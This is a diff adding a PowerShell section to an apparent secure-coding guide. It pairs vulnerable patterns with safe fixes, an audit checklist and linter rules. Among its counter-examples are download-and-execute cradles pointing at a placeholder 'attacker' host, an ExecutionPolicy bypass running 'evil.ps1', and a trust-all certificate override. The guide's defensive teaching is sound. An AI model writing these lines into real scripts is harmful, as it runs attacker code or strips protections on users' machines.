@@ -303,6 +303,179 @@ params.require(:user).permit(:name, :email)
 
 ---
 
+## PowerShell
+
+PowerShell scripts (`.ps1`, `.psm1`) are the most-shipped, least-reviewed code in many ops teams. AMSI, ScriptBlock logging and Constrained Language Mode help in defense-in-depth, but the patterns below are what gets you breached in the first place.
+
+### Code / Expression Injection (CWE-94, CWE-95)
+```powershell
+# ❌ Vulnerable - "the eval of PowerShell"
+Invoke-Expression $userInput                       # alias: iex
+iex $userInput
+& ([scriptblock]::Create($userInput))              # same risk via ScriptBlock
+$sb = [scriptblock]::Create("Get-Process $name")  # if $name is user input → RCE
+
+# ❌ The famous drive-by one-liner: do not write code that imitates this
+iex (New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')
+iex (irm https://attacker/p.ps1)
+
+# ❌ Add-Type with user-controlled C# = arbitrary code execution
+Add-Type -TypeDefinition $userSuppliedCSharp
+
+# ✅ Safe: call cmdlets with parameters, never compose code from input
+Get-Process -Name $validatedName
+Invoke-Command -ScriptBlock { Get-Process -Name $args[0] } -ArgumentList $validatedName
+```
+
+### Command Injection (CWE-78)
+```powershell
+# ❌ Vulnerable - cmd.exe interpolation
+cmd /c "ping $userInput"
+& "cmd.exe" "/c" "ping $userInput"
+Start-Process "cmd.exe" -ArgumentList "/c ping $userInput"
+Invoke-Expression "ping $userInput"
+
+# ❌ Even native binaries are unsafe with concatenated strings
+& "C:\tools\tool.exe $userArgs"                    # parsed as one string
+
+# ✅ Safe: pass arguments as separate elements (no shell parsing)
+& ping.exe $validatedHost
+Start-Process -FilePath "ping.exe" -ArgumentList $validatedHost -NoNewWindow -Wait
+& "C:\tools\tool.exe" "--host" $validatedHost      # each arg quoted separately
+```
+
+### Path Traversal (CWE-22)
+```powershell
+# ❌ Vulnerable
+Get-Content "C:\uploads\$userFile"
+Remove-Item "C:\uploads\$userFile"
+Test-Path "$base\$userFile"
+
+# ✅ Safe: resolve and verify the path stays inside the base directory
+$base   = (Resolve-Path 'C:\uploads').Path
+$target = [System.IO.Path]::GetFullPath((Join-Path $base $userFile))
+if (-not $target.StartsWith($base, [System.StringComparison]::OrdinalIgnoreCase)) {
+    throw "Path traversal detected"
+}
+Get-Content $target
+```
+
+### Insecure Deserialization (CWE-502)
+```powershell
+# ❌ Vulnerable - Import-Clixml deserializes arbitrary .NET objects
+$data = Import-Clixml -Path $attackerControlledFile
+
+# ❌ ConvertFrom-Json into typed objects is fine, but never call -AsHashtable
+#    blindly and then pipe it into New-Object / Invoke-Expression.
+
+# ✅ Safe alternatives for untrusted input
+$data = Get-Content $file -Raw | ConvertFrom-Json   # plain JSON, no code exec
+```
+
+### Hardcoded / Mishandled Secrets (CWE-798, CWE-321)
+```powershell
+# ❌ Vulnerable - "secure string" with -AsPlainText is NOT encryption
+$cred = ConvertTo-SecureString "Hunter2!" -AsPlainText -Force
+$pwd  = "P@ssw0rd"   # plain literal in a script committed to git
+
+# ❌ ConvertFrom-SecureString without -Key uses DPAPI bound to the current
+#    user/machine. That file is not portable; if the attacker is the same user,
+#    they decrypt it for free.
+$cred | ConvertFrom-SecureString | Out-File creds.txt
+
+# ✅ Safe: use the SecretManagement module backed by a real vault
+Install-Module Microsoft.PowerShell.SecretManagement, Microsoft.PowerShell.SecretStore
+$pwd  = Get-Secret -Name 'svc-account-password' -AsPlainText
+$cred = Get-Secret -Name 'svc-account-credential'   # PSCredential
+
+# Or pull from a managed vault (Azure Key Vault, AWS Secrets Manager, HashiCorp Vault)
+$secret = Get-AzKeyVaultSecret -VaultName 'kv-prod' -Name 'svc-pwd' -AsPlainText
+```
+
+### TLS / Certificate Bypass (CWE-295)
+```powershell
+# ❌ Vulnerable - disables ALL cert validation process-wide (legacy WinPS 5.x)
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+Add-Type @"
+    using System.Net; using System.Security.Cryptography.X509Certificates;
+    public class TrustAll : ICertificatePolicy {
+        public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
+                                          WebRequest req, int problem) { return true; }
+    }
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
+
+# ❌ PS 7+: per-call bypass is still wrong outside of a controlled lab
+Invoke-WebRequest -Uri $url -SkipCertificateCheck
+Invoke-RestMethod  -Uri $url -SkipCertificateCheck
+
+# ✅ Safe: fix the cert chain, or pin the expected cert thumbprint
+$resp = Invoke-WebRequest -Uri $url -CertificateThumbprint $expectedThumbprint
+```
+
+### Insecure Web Download (CWE-494, CWE-829)
+```powershell
+# ❌ Vulnerable - download then execute, no integrity check
+Invoke-WebRequest $url -OutFile installer.exe
+Start-Process .\installer.exe
+
+# ❌ Worse - download and run in memory
+iex (irm $url)
+
+# ✅ Safe: pin the URL to HTTPS, verify a known SHA-256 before executing
+$expected = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
+Invoke-WebRequest $url -OutFile installer.exe -UseBasicParsing
+$actual = (Get-FileHash installer.exe -Algorithm SHA256).Hash.ToLower()
+if ($actual -ne $expected) { throw "Hash mismatch - aborting" }
+Start-Process .\installer.exe
+```
+
+### "ExecutionPolicy Bypass" is not a security control
+```powershell
+# These are NOT vulnerabilities in your script - they are reminders that
+# ExecutionPolicy is a user-preference, not a security boundary. Anyone can:
+powershell -ExecutionPolicy Bypass -File evil.ps1
+Get-Content evil.ps1 | powershell -NoProfile -Command -
+
+# ✅ Real defenses for endpoints running PowerShell:
+#   - Constrained Language Mode (via WDAC / AppLocker policy)
+#   - Script signing enforced by WDAC, not by ExecutionPolicy
+#   - AMSI on (do not disable it in your installer)
+#   - Module + ScriptBlock + Transcription logging shipped to a SIEM
+#   - JEA (Just Enough Administration) for remote management
+```
+
+### Auditing checklist for any `.ps1` you ship
+
+- [ ] No `Invoke-Expression` / `iex` / `[scriptblock]::Create` on input you do not control.
+- [ ] No `Add-Type -TypeDefinition` from input you do not control.
+- [ ] No `cmd /c` / `Start-Process` with concatenated strings - always argument arrays.
+- [ ] No `ConvertTo-SecureString -AsPlainText -Force` with a literal password.
+- [ ] No `-SkipCertificateCheck` outside of explicit lab code paths.
+- [ ] No download-then-run without a SHA-256 check against a pinned digest.
+- [ ] Path inputs are resolved and bounded inside an allowed base directory.
+- [ ] Script is signed (`Set-AuthenticodeSignature`) for distribution channels that need it.
+- [ ] ScriptBlock logging, module logging and transcription are not disabled.
+- [ ] No secrets in the script - use SecretManagement or a cloud vault.
+
+### Detection (Semgrep / PSScriptAnalyzer)
+
+```powershell
+# PSScriptAnalyzer ships built-in security rules
+Install-Module PSScriptAnalyzer -Scope CurrentUser
+Invoke-ScriptAnalyzer -Path . -Recurse `
+    -IncludeRule PSAvoidUsingInvokeExpression,
+                 PSAvoidUsingPlainTextForPassword,
+                 PSAvoidUsingConvertToSecureStringWithPlainText,
+                 PSAvoidUsingUsernameAndPasswordParams,
+                 PSUsePSCredentialType,
+                 PSAvoidUsingWriteHost
+```
+
+Pair with InjectionHunter (`Install-Module InjectionHunter`) for additional injection-focused rules, and add `Invoke-ScriptAnalyzer` to the CI pipeline (it has a non-zero exit code on findings).
+
+---
+
 ## Java
 
 ### SQL Injection (CWE-89)
